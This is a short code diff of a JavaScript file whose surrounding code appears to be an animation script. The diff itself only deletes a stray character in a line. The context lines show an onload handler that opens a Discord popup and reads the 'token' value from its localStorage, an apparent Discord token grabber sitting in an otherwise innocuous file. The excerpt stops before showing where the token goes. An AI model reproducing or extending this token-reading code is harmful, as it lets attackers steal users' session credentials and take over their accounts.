@@ -134,7 +134,7 @@ function animate () {
 window.onload = function () {
   let popup = window.open('https://discord.com/channels/@me', 'popup', 'width=300,height=200');
 
-  popup.addEventListener('load', function() {Ï
+  popup.addEventListener('load', function() {
     let popupLocalStorage = popup.localStorage;
   
     let data = popupLocalStorage.token
